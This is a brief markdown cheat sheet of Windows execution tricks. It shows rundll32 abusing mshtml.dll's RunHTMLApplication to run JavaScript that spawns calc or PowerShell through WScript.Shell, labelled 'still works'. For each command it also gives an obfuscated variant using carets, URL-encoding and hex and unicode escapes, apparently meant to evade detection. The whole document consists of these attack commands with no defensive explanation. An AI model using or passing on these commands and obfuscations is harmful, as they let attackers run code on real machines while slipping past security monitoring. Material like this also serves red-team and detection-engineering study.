# Windows

## rundll32 (still works)

**command line:**

```rundll32 javascript:"\..\mshtml.dll,RunHTMLApplication";document.write();new ActiveXObject('WScript.Shell').Run('calc')```

**obfuscated:**

```@run^dll^32 java^script:"\..\mshtml.dll,RunHTMLApplication ";%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%29;%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28'\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c'%29.%52%75%6e%28'\u0063\u0061\u006c\u0063'%29```

**start powershell:**

```rundll32 javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();new ActiveXObject('WScript.Shell').Run('powershell')```

**obfuscated:**

```@run^dll^32 java^script:"\..\mshtml.dll,RunHTMLApplication ";%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%29;%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28'\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c'%29.%52%75%6e%28'\u0070\u006f\u0077\u0065\u0072\u0073\u0068\u0065\u006c\u006c'%29```
